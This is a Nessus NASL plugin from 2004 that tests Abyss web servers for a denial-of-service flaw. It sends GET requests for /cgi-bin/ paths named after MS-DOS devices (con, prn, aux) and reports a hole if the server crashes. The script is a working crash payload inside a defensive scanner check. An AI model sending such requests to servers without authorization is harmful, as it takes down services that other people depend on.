#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
#  Ref: R00tCr4ck <root@cyberspy.org>
#
#  This script is released under the GNU GPL v2
# 

if(description)
{
 script_id(15563);
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"11006");
 script_version ("$Revision: 1.2 $");
 name["english"] = "Abyss httpd DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to kill the web server by sending a MS-DOS device 
names in an HTTP request.

An attacker may use this flaw to prevent this host from performing its 
job properly.

Solution : Upgrade your web server to the latest version
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Try to pass a MS-DOS device name to crash the remote web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:80);
if(! get_port_state(port)) exit(0);
if(http_is_dead(port:port))exit(0);

function check(pt,dev)
{
  req = string("GET /cgi-bin/",dev," HTTP/1.0\r\n\r\n");
  soc = http_open_socket(pt);
  if(! soc) exit(0);

  send(socket:soc, data: req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port: pt)) { security_hole(pt); exit(0);}
}

dev_name=make_list("con","prn","aux");
foreach devname (dev_name)
{
  check(pt:port, dev:devname);
}
